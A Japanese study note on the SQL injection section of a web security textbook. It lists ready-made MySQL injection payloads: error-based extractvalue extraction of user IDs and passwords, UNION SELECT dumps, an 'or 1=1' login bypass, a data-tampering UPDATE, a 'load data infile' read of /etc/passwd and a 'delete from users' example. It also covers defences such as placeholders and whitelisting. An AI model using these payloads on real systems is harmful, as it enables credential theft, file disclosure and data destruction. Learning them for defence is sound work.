# 徳丸本
- ## 4章 Webアプリケーションの機能別に見るセキュリティバグ(続き)
- ### 4.4 SQL呼び出しに伴う脆弱性
	- エラーメッセージ経由の情報漏洩
		- extractvalue関数を利用するパターンがある([参考](https://blog.tokumaru.org/2012/12/blind-sql-injection-php-exploit.html))
		- extractvalue関数は、第一引数にXML、第二引数にXPath式を受け取り、XPath式に従って文字列の切り出しをするもの
			- ```mysql
			  mysql> select extractvalue('<a><b>xss</b><b>csrf</b></a>', '/a/b');
			  +------------------------------------------------------+
			  | extractvalue('<a><b>xss</b><b>csrf</b></a>', '/a/b') |
			  +------------------------------------------------------+
			  | xss csrf                                             |
			  +------------------------------------------------------+
			  1 row in set (0.00 sec)
			  ```
		- XPATH式では`$`を使うことで変数を参照することができ、存在しない変数を参照しようとすると以下のようなエラーが表示される
			- ```mysql 
			  mysql> select extractvalue('<a><b>xss</b><b>csrf</b></a>', '$a');
			  ERROR 1105 (HY000): Unknown XPATH variable at: '$a'
			  ```
		- エラー内容をそのまま表示してしまうアプリケーションの場合、XPATH式に重要情報を埋め込んだペイロードを送信することで、重要情報を取得することが出来る
			- 例
				- 検索に使われる文字列に以下を指定する
					- `'%20and%20extractvalue(0,%20(select%20concat('$',%20id,%20':',%20pwd)%20from%20users%20limit%201));%20--%20`
					- `--`はコメントアウトを意味するが、その後にスペースがないとエラーになる([参考](https://dev.mysql.com/doc/refman/8.0/ja/comments.html))
				- 画面に出力されるエラー文
					- `Error : SQLSTATE[HY000]: General error: 1105 Unknown XPATH variable at: '$yamada:pass1'`
			- テーブル名やカラム名を知った上での攻撃になる
				- information_schema.columnsテーブルからテーブル名とカラム名の両方を取得することが出来る([参考](https://qiita.com/Naoki206/items/b4581c87f148cf5a1595))
				- 例えば、アプリケーションのユーザを管理するテーブルの名前と、そのテーブルのカラム名を知りたい時は、検索に使われる文字に以下を指定する
					- `'%20and%20extractvalue(0,%20(select%20concat('$',%20table_name,%20':',%20column_name)%20from%20information_schema.columns%20where%20table_name%20like%20'%25user%25'%20limit%201));%20--%20`
				- 画面に出力されるエラー文
					- `Error : SQLSTATE[HY000]: General error: 1105 Unknown XPATH variable at: '$USER_PRIVILEGES:GRANTEE'`
					- USER_PRIVILEGESテーブルにGRANTEEカラムがあることが分かったが、USER_PRIVILEGESテーブルはMySQLユーザの権限を管理するテーブルであり、アプリケーションのユーザを管理するテーブルではない
						- offsetを指定して地道に見つける必要がある
	- UNION SELECTを用いた情報漏洩
		- 検索クエリに使われる文字列に以下を指定する
			- `'%20union%20select%20id,%20name,%20pwd,%20addr,%20null,%20null,%20null%20from%20users;%20--%20`
			- union先のselect文のカラム数(この場合は7個)に合わせるために、nullを使っている
		- union先のselect文のカラム数や、(型付き言語の場合)各カラムの型を知った上での攻撃となる
			- これが分かれば、簡単にテーブル名やカラム名やカラムの型を知ることが出来る
				- `'%20union%20select%20table_name,%20column_name,%20data_type,%20null,%20null,%20null,%20null%20from%20information_schema.columns;%20--%20`
	- 認証回避
		- パスワードに`%27+or+1+%3D+1%3B+--+`などを指定する
	- データ改竄
		- 検索に使われる文字列に以下を指定する
			- `';%20update%20books%20set%20title%20=%20'cracked!'%20where%20id%20=%20'1001';%20--%20`
		- 実際の攻撃ではiframe要素やscript要素をWebページに埋め込んで、利用者のPCにマルウェアを感染させるように誘導する(SQLインジェクションだけでなく、XSSの脆弱性も同時にないと出来ない)
	- ファイルの読み出し
		- 検索に使われる文字列に以下を指定する
			- `';%20load%20data%20infile%20'/etc/passwd'%20into%20table%20books(title);%20--%20`
			- [load data infile文](https://dev.mysql.com/doc/refman/8.0/ja/load-data.html)はMySQLの拡張機能で、ファイルをテーブルに読み込むことが出来る
			- この例だと/etc/passwdの内容をbooksテーブルのtitleカラムに書き込む(titleカラム以外はnullになる)
			- booksテーブルのレコードをWebアプリ上で確認して、/etc/passwdの情報を盗むことが出来る
	- PHPやPerlなどの型無し言語の場合、文字列項目だけでなく数値項目に対してもSQLインジェクションが発生する可能性がある(本来数値であるべき型に文字列を代入することが出来るため)
		- `select * from users where age < $age`の`$age`に`1; delete from users`を指定するなど
	- SQLインジェクションの対策は[[Jul 14th, 2023]]を参照
	- リクエストによって、SQL文の構造が変化する場合、プレースホルダを使わずに、文字列連結を使いたくなってしまうことがある
		- 検索条件の数が変化する場合
			- リクエストボディの中に含まれるパラメータを使って検索をする場合
				- 名前だけがあったら名前だけで検索する、名前と年齢があったら名前と年齢で検索する
			- プレースホルダ(`?`)を含んだSQL文を連結していけば良い
				- `select * from users where 1 = 1`が元のSQL文
				- 名前があったら`and name = ?`を追加
				- 年齢があったら`and age <= ?`を追加
				- `1 = 1`を書くことで、追加するSQL文を全て`and`で始めることが出来るので、処理が簡単になる
		- ソート列をユーザが指定できる場合
			- ORDER BYなどではプレースホルダーを使うことが出来ないので、文字列連結をするしかない
				- プレースホルダが使えるのはリテラル部分だけ([参考](http://blog.a-way-out.net/blog/2013/12/19/sql-injection-prevention/))
			- リクエストボディ中に含まれるソート列をホワイトリストで検証する
				- 一般にブラックリストで検証するよりもホワイトリストで検証する方が安全(ブラックリストで検証すると考慮漏れする可能性が高い)
	- SQLインジェクションの保険的対策
		- 詳細なエラーメッセージの抑止
			- データベースのエラーをそのままAPIのレスポンスに含んだら駄目
		- 入力値検証
			- コメント欄など文字種制限のないパラメータもあるので、あくまでも保険的対策
		- データベースの権限設定
			- データベースのユーザに書き込み権限は与えず、読み込み権限だけ与えるなど
			- load data infile文はMySQLのFILE権限がないと出来ない
	- SQLインジェクションと関係のない話
		- MySQLには暗黙の型変換という機能があり、MySQLが出来る限り型変換をしようとするため、想定外の挙動が起きることがある([参考](https://sakaik.hateblo.jp/entry/20210426/mysql_string_number_auto_exchange_bikkuri))
		- LIKE句におけるワイルドカードのエスケープ
			- LIKE句では、`_`は任意の一文字、`%`は0文字以上の任意の文字列にマッチする
			- そのため、`_`, `%`を検索文字列に含めたい場合はエスケープする必要があり、`\_`, `\%`とすることでエスケープすることが出来る
			- エスケープのための文字を指定することも出来る(例: `where name like '%りんご100#%%' escape '#'`)